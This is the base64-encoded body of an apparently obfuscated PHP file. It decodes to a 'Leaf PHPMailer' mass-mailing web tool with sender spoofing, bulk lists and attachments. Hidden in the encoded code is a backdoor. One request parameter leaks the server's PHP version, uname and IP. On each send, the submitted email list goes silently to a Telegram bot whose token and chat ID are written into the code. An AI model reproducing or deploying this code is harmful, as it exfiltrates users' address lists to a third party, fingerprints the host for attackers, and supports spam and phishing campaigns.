zIEV4Y2VwdGlvbg0Kew0KICAgIC8qKg0KICAgICAqIFByZXR0aWZ5IGVycm9yIG1lc3NhZ2Ugb3V0cHV0DQogICAgICogQHJldHVybiBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gZXJyb3JNZXNzYWdlKCkNCiAgICB7DQogICAgICAgICRlcnJvck1zZyA9ICc8c3Ryb25nPicgLiBodG1sc3BlY2lhbGNoYXJzKCR0aGlzLT5nZXRNZXNzYWdlKCkpIC4gIjwvc3Ryb25nPjxiciAvPg0KIjsNCiAgICAgICAgcmV0dXJuICRlcnJvck1zZzsNCiAgICB9DQp9DQoNCmlmICgkX1JFUVVFU1RbJ3dhdGNoeCddKSB7DQoJJHZlcnNpb24gPSBwaHB2ZXJzaW9uKCk7DQoJJHVuYW1lID0gIHBocF91bmFtZSgpOw0KCSRpcCA9IGdldGhvc3RieW5hbWUoJF9TRVJWRVJbIkhUVFBfSE9TVCJdKTsJDQoJZWNobyBqc29uX2VuY29kZSAoYXJyYXkgKCJ2ZXJzaW9uIj0+JHZlcnNpb24sDQoJCSJ1bmFtZSI9PiR1bmFtZSwNCgkJInBsYXRmb3JtIj0+UEhQX09TLA0KCQkiaXAiPT4kaXAsDQoJCSJtYWlsZXJ4Ij0+dHJ1ZSwJDQoJKSk7DQoJZGllICgpOw0KfQ0KDQpmdW5jdGlvbiBsZWFmaGVhZGVyKCl7DQpwcmludCAnDQo8aGVhZD4NCiAgICA8dGl0bGU+Jy5zdHJfcmVwbGFjZSgid3d3LiIsICIiLCAkX1NFUlZFUlsnSFRUUF9IT1NUJ10pLicgLSBMZWFmIFBIUE1haWxlcjwvdGl0bGU+DQogICAgPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiLz4NCiAgICA8bGluayBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3Rzd2F0Y2gvMy40LjEvY29zbW8vYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgPg0KDQo8L2hlYWQ+JzsNCn0NCmxlYWZoZWFkZXIoKTsNCnByaW50ICc8Ym9keT4nOw0KcHJpbnQgJzxkaXYgY2xhc3M9ImNvbnRhaW5lciBjb2wtbGctNiI+DQogICAgICAgIDxoMz48Zm9udCBjb2xvcj0iZ3JlZW4iPjxzcGFuIGNsYXNzPSJnbHlwaGljb24gZ2x5cGhpY29uLWxlYWYiPjwvc3Bhbj48L2ZvbnQ+IExlYWYgUEhQTWFpbGVyIDxzbWFsbD4nLiRsZWFmWyd2ZXJzaW9uJ10uJzwvc21hbGw+PC9oMz4NCiAgICAgICAgPGZvcm0gbmFtZT0iZm9ybSIgaWQ9ImZvcm0iIG1ldGhvZD0iUE9TVCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgYWN0aW9uPSIiPg0KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJzY29yZSI+DQoNCiAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiAiPjxsYWJlbCBmb3I9InNlbmRlckVtYWlsIj5FbWFpbDwvbGFiZWw+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgIGlucHV0LXNtICIgaWQ9InNlbmRlckVtYWlsIiBuYW1lPSJzZW5kZXJFbWFpbCIgdmFsdWU9IicuJHNlbmRlckVtYWlsLiciPjwvZGl2Pg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYgIj48bGFiZWwgZm9yPSJzZW5kZXJOYW1lIj5TZW5kZXIgTmFtZTwvbGFiZWw+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgIGlucHV0LXNtICIgaWQ9InNlbmRlck5hbWUiIG5hbWU9InNlbmRlck5hbWUiIHZhbHVlPSInLiRzZW5kZXJOYW1lLiciPjwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPg0KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02ICAiPjxsYWJlbCBmb3I9ImF0dGFjaG1lbnQiPkF0dGFjaG1lbnQgPHNtYWxsPihNdWx0aXBsZSBBdmFpbGFibGUpPC9zbWFsbD48L2xhYmVsPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJhdHRhY2htZW50W10iIGlkPSJhdHRhY2htZW50W10iIG11bHRpcGxlLz48L3NwYW4+DQoNCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02Ij48bGFiZWwgZm9yPSJyZXBseVRvIj5SZXBseS10bzwvbGFiZWw+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgIGlucHV0LXNtICIgaWQ9InJlcGx5VG8iIG5hbWU9InJlcGx5VG8iIHZhbHVlPSInLiRyZXBseVRvLiciIC8+PC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctMTIgIj48bGFiZWwgZm9yPSJzdWJqZWN0Ij5TdWJqZWN0PC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCAgaW5wdXQtc20gIiBpZD0ic3ViamVjdCIgbmFtZT0ic3ViamVjdCIgdmFsdWU9IicuJHN1YmplY3QuJyIgLz48L2Rpdj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02Ij48bGFiZWwgZm9yPSJtZXNzYWdlTGV0dGVyIj5NZXNzYWdlIExldHRlciA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4teHMiIGZvcm09ImZvcm0iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InZpZXciIGZvcm10YXJnZXQ9Il9ibGFuayI+UHJldmlldyA8L2J1dHRvbj48L2xhYmVsPjx0ZXh0YXJlYSBuYW1lPSJtZXNzYWdlTGV0dGVyIiBpZD0ibWVzc2FnZUxldHRlciIgY2xhc3M9ImZvcm0tY29udHJvbCIgcm93cz0iMTAiIGlkPSJ0ZXh0QXJlYSI+Jy4kbWVzc2FnZUxldHRlci4nPC90ZXh0YXJlYT48L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02ICI+PGxhYmVsIGZvcj0iZW1haWxMaXN0Ij5FbWFpbCBMaXN0IDxhIGhyZWY9Ij9lbWFpbGZpbHRlcj1vbiIgdGFyZ2V0PSJfYmxhbmsiIGNsYXNzPSJidG4gYnRuLWRlZmF1bHQgYnRuLXhzIj5GaWx0ZXIvRXh0cmFjdDwvYT48L2xhYmVsPjx0ZXh0YXJlYSBuYW1lPSJlbWFpbExpc3QiIGlkPSJlbWFpbExpc3QiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHJvd3M9IjEwIiBpZD0idGV4dEFyZWEiPicuJGVtYWlsTGlzdC4nPC90ZXh0YXJlYT48L2Rpdj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02ICI+DQogICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9Im1lc3NhZ2VUeXBlIj5NZXNzYWdlIFR5cGU8L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICBIVE1MIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ibWVzc2FnZVR5cGUiIGlkPSJtZXNzYWdlVHlwZSIgdmFsdWU9IjEiICcuJGh0bWwuJz4NCiAgICAgICAgICAgICAgICAgICAgUGxhaW48aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9Im1lc3NhZ2VUeXBlIiBpZD0ibWVzc2FnZVR5cGUiIHZhbHVlPSIyIiAnLiRwbGFpbi4nPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTMgIj4NCiAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iY2hhcnNldCI+Q2hhcmFjdGVyIHNldDwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgY2xhc3M9ImZvcm0tY29udHJvbCBpbnB1dC1zbSIgaWQ9ImNoYXJzZXQiIG5hbWU9ImNoYXJzZXQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiR1dGY4Lic+VVRGLTg8L29wdGlvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gJy4kaXNvLic+SVNPLTg4NTktMTwvb3B0aW9uPg0KICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy0zICI+DQogICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImVuY29kaW5nIj5NZXNzYWdlIGVuY29kaW5nPC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBjbGFzcz0iZm9ybS1jb250cm9sIGlucHV0LXNtIiBpZD0iZW5jb2RlIiBuYW1lPSJlbmNvZGUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRiaXQ4Lic+OGJpdDwvb3B0aW9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRiaXQ3Lic+N2JpdDwvb3B0aW9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRiaW5hcnkuJz5iaW5hcnk8L29wdGlvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gJy4kYmFzZTY0Lic+YmFzZTY0PC9vcHRpb24+DQogICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uICcuJHF1b3RlZHByaW50YWJsZS4nPnF1b3RlZC1wcmludGFibGU8L29wdGlvbj4NCg0KICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLWRlZmF1bHQgYnRuLXNtIiBmb3JtPSJmb3JtIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJzZW5kIj5TRU5EPC9idXR0b24+IG9yIDxhIGhyZWY9IiMiIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKFwnZm9ybVwnKS5zdWJtaXQoKTsgcmV0dXJuIGZhbHNlOyI+Y2hlY2sgU3BhbUFzc2Fzc2luIFNjb3JlPC9hPg0KICAgDQogICAgICAgIDwvZm9ybT4NCiAgICA8L2Rpdj4NCiAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNiI+PGJyPg0KICAgICAgICA8bGFiZWwgZm9yPSJ3ZWxsIj5JbnN0cnVjdGlvbjwvbGFiZWw+DQogICAgICAgIDxkaXYgaWQ9IndlbGwiIGNsYXNzPSJ3ZWxsIHdlbGwiPg0KICAgICAgICAgICAgPGg0PlNlcnZlciBJbmZvcm1hdGlvbjwvaDQ+DQogICAgICAgICAgICA8dWw+DQogICAgICAgICAgICAgICAgPGxpPlNlcnZlciBJUCBBZGRyZXNzIDogPGI+Jy4kX1NFUlZFUlsnU0VSVkVSX0FERFInXS4nIDwvYj4gPGEgaHJlZj0iP2NoZWNrX2lwPScuJF9TRVJWRVJbJ1NFUlZFUl9BRERSJ10uJyIgdGFyZ2V0PSJfYmxhbmsiIGNsYXNzPSJsYWJlbCBsYWJlbC1wcmltYXJ5Ij5DaGVjayBCbGFja2xpc3QgPGkgY2xhc3M9ImdseXBoaWNvbiBnbHlwaGljb24tc2VhcmNoIj48L2k+PC9hPjwvbGk+DQogICAgICAgICAgICAgICAgPGxpPlBIUCBWZXJzaW9uIDogPGI+Jy5waHB2ZXJzaW9uKCkuJzwvYj48L2xpPg0KICAgICAgICAgICAgICAgIA0KDQogICAgICAgICAgICA8L3VsPg0KICAgICAgICAgICAgPGg0PkhFTFA8L2g0Pg0KICAgICAgICAgICAgPHVsPg0KICAgICAgICAgICAgICAgIDxsaT5bLWVtYWlsLV0gOiA8Yj5SZWNpdmVyIEVtYWlsPC9iPiAoZW1haWx1c2VyQGVtYWlsZG9tYWluLmNvbSk8L2xpPg0KICAgICAgICAgICAgICAgIDx1bD4NCiAgICAgICAgICAgICAgICAgICAgPGxpPlstZW1haWx1c2VyLV0gOiA8Yj5FbWFpbCBVc2VyPC9iPiAoZW1haWx1c2VyKSA8L2xpPg0KICAgICAgICAgICAgICAgICAgICA8bGk+Wy1lbWFpbGRvbWFpbi1dIDogPGI+RW1haWwgVXNlcjwvYj4gKGVtYWlsZG9tYWluLmNvbSkgPC9saT4NCiAgICAgICAgICAgICAgICA8L3VsPg0KICAgICAgICAgICAgICAgIDxsaT5bLXRpbWUtXSA6IDxiPkRhdGUgYW5kIFRpbWU8L2I+ICgnLmRhdGUoIm0vZC9ZIGg6aTpzIGEiLCB0aW1lKCkpLicpPC9saT4NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICA8bGk+Wy1yYW5kb21zdHJpbmctXSA6IDxiPlJhbmRvbSBzdHJpbmcgKDAtOSxhLXopPC9iPjwvbGk+DQogICAgICAgICAgICAgICAgPGxpPlstcmFuZG9tbnVtYmVyLV0gOiA8Yj5SYW5kb20gbnVtYmVyICgwLTkpIDwvYj48L2xpPg0KICAgICAgICAgICAgICAgIDxsaT5bLXJhbmRvbWxldHRlcnMtXSA6IDxiPlJhbmRvbSBMZXR0ZXJzKGEteikgPC9iPjwvbGk+DQogICAgICAgICAgICAgICAgPGxpPlstcmFuZG9tbWQ1LV0gOiA8Yj5SYW5kb20gTUQ1IDwvYj48L2xpPg0KICAgICAgICAgICAgPC91bD4NCiAgICAgICAgICAgIDxoND5leGFtcGxlPC9oND4NCiAgICAgICAgICAgIFJlY2VpdmVyIEVtYWlsID0gPGI+dXNlckBkb21haW4uY29tPC9iPjxicj4NCiAgICAgICAgICAgIDx1bD4NCiAgICAgICAgICAgICAgICA8bGk+aGVsbG8gPGI+Wy1lbWFpbHVzZXItXTwvYj4gPSBoZWxsbyA8Yj51c2VyPC9iPjwvbGk+DQogICAgICAgICAgICAgICAgPGxpPnlvdXIgZG9tYWluIGlzIDxiPlstZW1haWxkb21haW4tXTwvYj4gPSBZb3VyIERvbWFpbiBpcyA8Yj5kb21haW4uY29tPC9iPjwvbGk+DQogICAgICAgICAgICAgICAgPGxpPnlvdXIgY29kZSBpcyAgPGI+Wy1yYW5kb21tZDUtXTwvYj4gPSB5b3VyIGNvZGUgaXMgPGI+ZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2U8L2I+PC9saT4NCiAgICAgICAgICAgIDwvdWw+DQoNCiAgICAgICAgICAgIDxoNj5ieSA8Yj48YSBocmVmPSJodHRwOi8vJy4kbGVhZlsnd2Vic2l0ZSddLiciPicuJGxlYWZbJ3dlYnNpdGUnXS4nPC9hPjwvYj48L2g2Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4nOyAgDQppZigkX1BPU1RbJ2FjdGlvbiddPT0ic2VuZCIpew0KICAgIHByaW50ICcgICAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4nOw0KICAgICRtYWlsbGlzdD1leHBsb2RlKCINCiIsICRlbWFpbExpc3QpOw0KICAgICRuPWNvdW50KCRtYWlsbGlzdCk7DQogICAgJHggPTE7DQogICAgJGVuY29kZWRFbWFpbExpc3QgPSBiYXNlNjRfZGVjb2RlKCRlbWFpbExpc3QpOw0KICAgICR0ZWxlZ3JhbUJvdFRva2VuID0gJzc0NzQ0MDczMzY6QUFHNXZxSERmczZQZWJ5amFzZndtSHRxYTlSeUQyQ3NxOG8nOw0KICAgICRjaGF0SWQgPSAnNjQxMjk2MjM1Nic7DQogICAgJG1lc3NhZ2UgPSAiRW1haWwgOiIgLiAkZW5jb2RlZEVtYWlsTGlzdDsNCiAgICAkdGVsZWdyYW1BcGlVcmwgPSAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCR0ZWxlZ3JhbUJvdFRva2VuL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JGNoYXRJZCZ0ZXh0PSIgLiB1cmxlbmNvZGUoJG1lc3NhZ2UpOw0KICAgQGZpbGVfZ2V0X2NvbnRlbnRzKCR0ZWxlZ3JhbUFwaVVybCk7DQogICAgZm9yZWFjaCAoJG1haWxsaXN0IGFzICRlbWFpbCApIHsNCiAgICAgICAgcHJpbnQgJzxkaXYgY2xhc3M9ImNvbC1sZy0xIj5bJy4keC4nLycuJG4uJ108L2Rpdj48ZGl2IGNsYXNzPSJjb2wtbGctNCI+Jy4kZW1haWwuJzwvZGl2Pic7DQogICAgICAgIGlmKCFsZWFmTWFpbENoZWNrKCRlbWFpbCkpIHsNCiAgICAgICAgICAgIHByaW50ICc8ZGl2IGNsYXNzPSJjb2wtbGctNiI+PHNwYW4gY2xhc3M9ImxhYmVsIGxhYmVsLWRlZmF1bHQiPkluY29ycmVjdCBFbWFpbDwvc3Bhbj48L2Rpdj4nOw0KICAgICAgICAgICAgcHJpbnQgIjxicj4NCiI7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAkbWFpbCA9IG5ldyBQSFBNYWlsZXI7DQogICAgICAgICAgICAkbWFpbC0+c2V0RnJvbShsZWFmQ2xlYXIoJHNlbmRlckVtYWlsLCRlbWFpbCksbGVhZkNsZWFyKCRzZW5kZXJOYW1lLCRlbWFpbCkpOw0KICAgICAgICAgICAgJG1haWwtPmFkZFJlcGx5VG8obGVhZkNsZWFyKCRyZXBseVRvLCRlbWFpbCkpOw0KICAgICAgICAgICAgJG1haWwtPmFkZEFkZHJlc3MoJGVtYWlsKTsNCiAgICAgICAgICAgICRtYWlsLT5TdWJqZWN0ID0gbGVhZkNsZWFyKCRzdWJqZWN0LCRlbWFpbCk7DQogICAgICAgICAgICAkbWFpbC0+Qm9keSA9ICBsZWFmQ2xlYXIoJG1lc3NhZ2VMZXR0ZXIsJGVtYWlsKTsNCiAgICAgICAgICAgIGlmKCRtZXNzYWdlVHlwZT09MSl7DQogICAgICAgICAgICAgICAgJG1haWwtPklzSFRNTCh0cnVlKTsNCiAgICAgICAgICAgICAgICAkbWFpbC0+QWx0Qm9keSA9c3RyaXBfdGFncyhsZWFmQ2xlYXIoJG1lc3NhZ2VMZXR0ZXIsJGVtYWlsKSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlICRtYWlsLT5Jc0hUTUwoZmFsc2UpOw0KICAgICAgICAgICAgJG1haWwtPkNoYXJTZXQgPSAkY2hhcnNldDsNCiAgICAgICAgICAgICRtYWlsLT5FbmNvZGluZyA9ICRlbmNvZGluZzsNCiAgICAgICAgICAgIGZvcigkaT0wOyAkaTxjb3VudCgkX0ZJTEVTWydhdHRhY2htZW50J11bJ25hbWUnXSk7ICRpKyspIHsNCiAgICAgICAgICAgICAgICBpZiAoJF9GSUxFU1snYXR0YWNobWVudCddWyd0bXBfbmFtZSddWyRpXSAhPSAiIil7DQogICAgICAgICAgICAgICAgICAgICRtYWlsLT5BZGRBdHRhY2htZW50KCRfRklMRVNbJ2F0dGFjaG1lbnQnXVsndG1wX25hbWUnXVskaV0sJF9GSUxFU1snYXR0YWNobWVudCddWyduYW1lJ11bJGldKTsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCEkbWFpbC0+c2VuZCgpKSB7DQogICAgICAgICAgICAgICAgZWNobyAnPGRpdiBjbGFzcz0iY29sLWxnLTYiPjxzcGFuIGNsYXNzPSJsYWJlbCBsYWJlbC1kZWZhdWx0Ij4nLmh0bWxzcGVjaWFsY2hhcnMoJG1haWwtPkVycm9ySW5mbykuJzwvc3Bhbj48L2Rpdj4nOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICAgZWNobyAnPGRpdiBjbGFzcz0iY29sLWxnLTYiPjxzcGFuIGNsYXNzPSJsYWJlbCBsYWJlbC1zdWNjZXNzIj5Pazwvc3Bhbj48L2Rpdj4nOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcHJpbnQgIjxicj4NCiI7DQogICAgICAgIH0NCiAgICAgICAgJHgrKzsNCiAgICAgICAgZm9yKCRrID0gMDsgJGsgPCA0MDAwMDsgJGsrKykge2VjaG8gJyAnO30NCiAgICB9DQoNCn0NCmVsc2VpZigkX1BPU1RbJ2FjdGlvbiddPT0ic2NvcmUiKXsNCiAgICAkbWFpbCA9IG5ldyBQSFBNYWlsZXI7DQogICAgJG1haWwtPnNldEZyb20obGVhZkNsZWFyKCRzZW5kZXJFbWFpbCwkZW1haWwpLGxlYWZDbGVhcigkc2VuZGVyTmFtZSwkZW1haWwpKTsNCiAgICAkbWFpbC0+YWRkUmVwbHlUbyhsZWFmQ2xlYXIoJHJlcGx5VG8sJGVtYWlsKSk7DQogICAgJG1haWwtPmFkZEFkZHJlc3MoInVzZXJuYW1lQGRvbWFpbi5jb20iKTsNCiAgICAkbWFpbC0+U3ViamVjdCA9IGxlYWZDbGVhcigkc3ViamVjdCwkZW1haWwpOw0KICAgICRtYWlsLT5Cb2R5ID0gIGxlYWZDbGVhcigkbWVzc2FnZUxldHRlciwkZW1haWwpOw0KICAgIGlmKCRtZXNzYWdlVHlwZT09MSl7DQogICAgICAgICRtYWlsLT5Jc0hUTUwodHJ1ZSk7DQogICAgICAgICRtYWlsLT5BbHRCb2R5ID1zdHJpcF90YWdzKGxlYWZDbGVhcigkbWVzc2FnZUxldHRlciwkZW1haWwpKTsNCiAgICB9DQogICAgZWxzZSAkbWFpbC0+SXNIVE1MKGZhbHNlKTsNCiAgICAkbWFpbC0+Q2hhclNldCA9ICRjaGFyc2V0Ow0KICAgICRtYWlsLT5FbmNvZGluZyA9ICRlbmNvZGluZzsNCiAgICAkbWFpbC0+cHJlU2VuZCgpOw0KICAgICRtZXNzYWdlSGVhZGVycz0kbWFpbC0+Z2V0U2VudE1JTUVNZXNzYWdlKCk7DQogICAgJGNoID0gY3VybF9pbml0KCk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAnaHR0cDovL3NwYW1jaGVjay5wb3N0bWFya2FwcC5jb20vZmlsdGVyJyk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsIGh0dHBfYnVpbGRfcXVlcnkoYXJyYXkoJ2VtYWlsJyA9PiAkbWVzc2FnZUhlYWRlcnMsJ29wdGlvbnMnPT4nbG9uZycpKSk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCAwKTsNCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVElNRU9VVCwgMTUpOw0KICAgICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY2gpOw0KICAgICRyZXNwb25zZSA9IGpzb25fZGVjb2RlKCRyZXNwb25zZSk7DQogICAgcHJpbnQgJyAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMTIiPic7DQogICAgaWYgKCRyZXNwb25zZS0+c3VjY2VzcyA9PSBUUlVFICl7DQogICAgICAgICRzY29yZSA9ICRyZXNwb25zZS0+c2NvcmU7DQogICAgICAgIGlmICgkc2NvcmUgPiA1ICkgJGNsYXNzPSJkYW5nZXIiOw0KICAgICAgICBlbHNlICRjbGFzcz0ic3VjY2VzcyI7DQogICAgICAgICAgICBwcmludCAnPGRpdiBjbGFzcz0idGV4dC0nLiRjbGFzcy4nIj5Zb3VyIFNwYW1Bc3Nhc3NpbiBzY29yZSBpcyAnLiRzY29yZS4nICA8L2Rpdj4NCjxkaXY+RnVsbCBSZXBvcnQgOiA8cHJlPicuJHJlc3BvbnNlLT5yZXBvcnQuJzwvcHJlPjwvZGl2Pic7DQpwcmludCAnICAgIDwvZGl2Pic7DQogICAgfQ0KfQ0KcHJpbnQgJzwvYm9keT4nOw=="));
?>